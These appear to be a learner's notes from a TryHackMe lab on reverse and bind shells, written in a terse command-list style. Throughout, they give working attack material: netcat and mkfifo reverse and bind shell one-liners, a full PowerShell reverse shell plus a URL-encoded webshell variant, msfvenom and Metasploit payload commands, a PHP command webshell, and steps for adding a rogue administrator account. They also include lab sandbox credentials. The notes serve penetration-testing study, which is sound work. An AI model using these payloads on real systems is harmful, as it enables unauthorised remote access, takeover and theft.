Intro to shells (CONTINUED):

    "COMMON SHELL PAYLOADS"
        * In some versions of netcat we can include -e to execute a process upon connection:
            [nc -lvnp <PORT> -e /bin/bash]              Connecting to this listener results in bind shell on target
            Similiarly:
            [nc <LOCAL-IP> <PORT> -e /bin/bash ]        Results in a reverse shell.

        ** HOWEVER, this is not included in most version of NC! BC it's seen as insecure. DUH
        ** "On Windows, where a static binary is nearly always required, works perfectly. However not on Linux"

        "EQUIV LINUX BIND SHELL"
            [mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f]     
        "EQUIV LINUX REVERSE SHELL"
            [mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f]

        Explanation:
        The command first creates a named pipe at /tmp/f. 
        It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. 
        The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, 
        sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

        * On modern Windows Server, very common to want a powershell reverse shell
        "WINDOWS POWERSHELL REVERSE SHELL ONE LINER"
        [
            powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        ]
            ^^ Replace <IP> and <PORT>
            * Then, just copy into cmd.exe (or any other method to execute commands). Reverse shell set up.

            *** FOR MORE REVERSE SHELL PAYLOADS, USE:  "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"


    "MSFVENOM:"
        * One stop shop for everything payload related! Part of Metasploit. Used for lower level exploit dev.
        * Used to develope hexademical shellcode when dev e.g Buffer Overflow exploit.
        ** "ALSO USED TO GENERATE PAYLOADS IN VARIOUS FORMATS (.exe, .aspx, .war, .py)"

        [msfvenom -p <PAYLOAD> <OPTIONS>]           Standard msfvenom command
        [msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>]
                    => Generates a windows x64 reverse shell in .exe format.
        ...where 
        [f <format>]            Specifies the output format. In this case that is an executable (exe)
        [-o <file>]             The output location and filename for the generated payload.
        [LHOST=<IP>]            Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
        [LPORT=<port>]          The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

        REMEMBER: Staged vs Stageless
        * "Staged payloads are sent in two steps. Stager executed on target (no rev shell here), connects to listener and loads the REAL PAYLOAD"
            - Executes directly, doesn't touch disk, (attempt to avoid traditional antivirus).
            - Staged payloads require a special listener, usually "Metasploit multi/handler"
       
        * "Stageless payloads are more command. Self contained"
            - Once executed, sends a shell directly back to the waiting listener.

        ** Stageless is easy to use and easy to catch, also bulkier. Staged are harder to use but bypasses less effective antivirus.
            * Staged have become less effective than previously due to Anti-Malware Scan Interface (AMSI).

        "METERPRETER"
            * Meterpreter shell is Metasploits own brand of fully featured shell.
            * Completely stable, therefore good for Windows!
            * Built in functionality such as file uploads and downloads.
            * Needed for Metasploit post exploitation.
            ** DOWNSIDE Meterpreter shells must be caught in Metasploit.

    "PAYLOAD NAMING CONVENTIONS"
        Stageless: ("Note the underscores!")
            [<OS>/<arch>/<payload>]             Basic convention
            Linux Example:          [linux/x86/shell_reverse_tcp]
            Windows Example:        [windows/shell_reverse_tcp]             Default is 32bit target
            Windows 64 E.g:         [windows/x64/meterpreter/reverse_tcp]

            [linux/x86/meterpreter_reverse_tcp]         Linux 32 bit stageless Meterpreter payload

        Staged: ("Note the //s!")
            [windows/x64/meterpreter/reverse_tcp]       Windows 64 bit staged Meterpreter payload

        MSFVENOM PAYLOAD SEARCH:
            [msfvenom --list payloads]                  Lists all payloads available
            [msfvenom --list payloads | grep "linux/x86/meterpreter"]       Searches payloads for TERM


        "TASK: GENERATE A STAGED REVERSE SHELL FOR 64B WINDOWS IN EXE FORMAT..."
        * TryHackMe tun0 IP:        [10.8.39.17]        This is MY private IP when connected through OpenVPN
        * [windows/x64/meterpreter/reverse_tcp]         Windows 64 bit staged Meterpreter payload

        "Generate a staged meterpreter reverse shell for a 64bit Linux target"
        * IP: 10.10.10.5        Port: 443
        [msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443]

    "METASPLOIT MULTI/HANDLER"
        * Great for catching shells, essential when using Meterpreter shells, go to when using staged payloads.
        1.  Open [msfconsole]       RUN AS SUDO!
        2.  [use multi/handler]
        3.  [options]
        4.  [
            * set PAYLOAD <payload>
            * set LHOST <listen-address>
            * set LPORT <listen-port>
            ]
        ** Now we can start the listener:
            [exploit -j]                    Runs as job in background, starts listener
            [sessions 1]                    Foreground after previously backgrounded

    "WEBSHELLS"
        * Soemtimes websites allow for uploading (or some other means) an executable file.
        * Ideally we would upload code to set up a bind/reverse shell. Sometimes not possible
        ** Therefore, use WEBSHELLS. A webshell is a script that runs inside a webserver to execute code on server (PHP,ASP).
        
        ** Commands entered on the web page (either HTML requests or direct URL arguments) are executed by the script.
        * Results returned and written to the page

        * This is useful when firewall is in place, or as stepping stone to fully fledged reverse/bind shell.
        "PHP IS THE MOST COMMON SERVER SIDE SCRIPTING LANGUAGE"

        EXAMPLE:
            [<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>]          
                * This takes a GET param in the URL and uses shell_exec() to execute on the system.
                ** "ANY COMANDS ENTERED AFTER "?cmd=" will be executed on the page" 
                ** Example: ifconfig, whoami, hostname, arch passed as commands return useful info. LINUX SPECIFIC
            
        "Kali has lots of webshells within  /usr/share/webshells"
        * Included in this is the infamous PentestMonkey php-reverse-shell.
            -> "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
        

        "ON WINDOWS, EASIER TO ACHIEVE RCE BY WEBSHELL OR MSFVENOM TO GENERATE REVERSE/BIND SHELL IN LANG OF SERVER"
        [powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22]
        ^^ This is copied into the "?cmd=" argument! Note URL encoding. CHANGE "IP" AND "PORT"!

    
    "We have a shell, what next?"
        * All of the above methods for catching shells tend to be unstable and non-interactive.
        How to fix?
            LINUX:  
                * Try to gain access to user account. 
                * [/home/<user>/.ssh]                           contains SSH keys.
                * "https://dirtycow.ninja/"                     Exploit to add our own account.
                * writeable [/etc/shadow] or [/etc/passwd]      Assuming SSH open, quick access.

            WINDOWS (More limited):
                * Can sometimes find passwords for running services in the registry.
                * E.g VNC server        Frequently leave passwords in registry stored in plaintext.
                * FileZilla FTP server  Stores MD5 hash/ plaintext at location:
                                        [C:\Program Files\FileZilla Server\FileZilla Server.xml]
                                        or [C:\xampp\FileZilla Server\FileZilla Server.xml]

                * Ideally we would have a shell running as SYSTEM or ADMIN user. In this case we can create our own account.
                    => when log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods
                [net user <username> <password> /add] [net localgroup administrators <username> /add]

                "Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, 
                however, they will never be as fully featured as a native shell. 
                Ideally we always want to escalate into using a "normal" method for accessing the machine, 
                as this will invariably be easier to use for further exploitation of the target."
                

    "OPENVPN":      [10.8.39.117]       Where we receive stuff

    "LINUX SANDBOX:"
            * u: shell      p: TryH4ckM3!       SSH on port 22      10.10.195.91

    "WINDOWS SANDBOX:"
            * u: Administrator      p: TryH4ckM3!
            * Login using RDP:
                [xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.195.91 /u:Administrator /p:'TryH4ckM3!']
            
            1. "Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine."
             * [ssh shell@10.10.195.91]          Connect via SSH
                * [<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>]        Create webshell.php these contents
                * Navigate to URL, upload file. Then navigate to where the file upload is.
                * [?cmd=id] [?cmd=whoami] [?cmd=pwd]              Append to file upload URL. Test for output
                * [nc -lvnp 4444]                                 Create listener on local
                * [nc 10.10.195.91 4444 -e /bin/bash]             Append to ?cmd= in order to send reverse shell back to listener.


                * [/usr/share/webshells/php]                    Navigate here within Kali to access exploit
                * Change port and IP vals
                * [nc 10.10.195.91 -lvnp 4444] / [nc -l -p 4444 -s 10.10.192.62 -v]
                * Navigate to "http://10.10.70.252/" and upload shell.php file
                * Should have successful connection.
                ** [nc 10.10.195.91 -lvnp 777]      New terminal in attackbox, set up listener with new port number
                * [nc 10.10.192.62 777 -e /bin/bash]        Type in previously caught shell, improving shell/ stepping stone to bash



            2. "Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell."
            * Answered above

            3. "Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells."
                * [ssh@IP_ADDR]             Connect via SSH.
                * [mkfifo /tmp/f; nc 10.10.192.62 777 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f]


            4. "Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques."
            
            5. "Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work."
            
            
            6. "Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?"
            
            
            7. "Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell."
            
            
            8. "The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM."
            
            
            9. "Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target."
            
            
            10. "Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell."
            msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=ATTACKBOXIP LPORT=443
            
            11. "Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?"
